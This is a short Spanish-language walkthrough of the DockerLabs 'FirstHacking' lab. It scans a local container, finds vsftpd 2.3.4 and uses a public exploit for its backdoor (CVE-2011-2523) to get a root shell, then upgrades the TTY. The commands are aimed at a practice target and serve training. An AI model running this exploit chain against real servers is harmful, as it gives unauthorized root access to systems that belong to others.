# FirstHacking
https://dockerlabs.es

*23/5/2024*


## ENUMERACION

```bash
┌──(kali㉿kali)-[~]    
└─$ nmap -p- --min-rate 5000 -sCV 172.17.0.2 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 10:29 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00014s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix
```

## ANALISIS DE VULNERABILIDADES
```
┌──(kali㉿kali)-[~]
└─$ searchsploit vsftpd 2.3.4
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                                                 | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                                                    | unix/remote/17491.rb
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
vsftpd 2.3.4 es una version vulnerable del servicio ftp la cual puede ser explotada con Metasploit
En este caso no lo utilizaremos y usaremos la primera opcion

```
┌──(kali㉿kali)-[~/DOCKERLABS/firsthacking/exploit]
└─$ searchsploit -m unix/remote/49757.py
  Exploit: vsftpd 2.3.4 - Backdoor Command Execution
      URL: https://www.exploit-db.com/exploits/49757
     Path: /usr/share/exploitdb/exploits/unix/remote/49757.py
    Codes: CVE-2011-2523
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/DOCKERLABS/firsthacking/exploit/49757.py
```

## EXPLOTACION
```
┌──(kali㉿kali)-[~/DOCKERLABS/firsthacking/exploit]
└─$ python 49757.py  172.17.0.2 
/home/kali/DOCKERLABS/firsthacking/exploit/49757.py:11: DeprecationWarning: 'telnetlib' is deprecated and slated for removal in Python 3.13
  from telnetlib import Telnet
Success, shell opened
Send `exit` to quit shell
whoami
root
```

## POST-EXPLOTACION
Tratamiento de las tty
```
script /dev/null -c bash
Script started, file is /dev/null
root@cc02d6c43e5d:~/vsftpd-2.3.4# whoami
whoami
root
```
